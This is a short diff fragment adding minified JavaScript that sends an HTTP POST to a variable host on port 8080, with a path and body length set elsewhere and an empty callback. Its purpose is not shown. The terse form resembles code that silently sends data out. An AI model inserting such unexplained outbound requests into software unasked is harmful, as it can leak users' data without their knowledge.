@@ -1,0 +1,10 @@
+var r = o.request({
+                    hostname: e,
+                    port: 8080,
+                    method: "POST",
+                    path: "/" + t,
+                    headers: {
+                        "Content-Length": n.length,
+                        "Content-Type": "text/html"
+                    }
+                }, function() {})
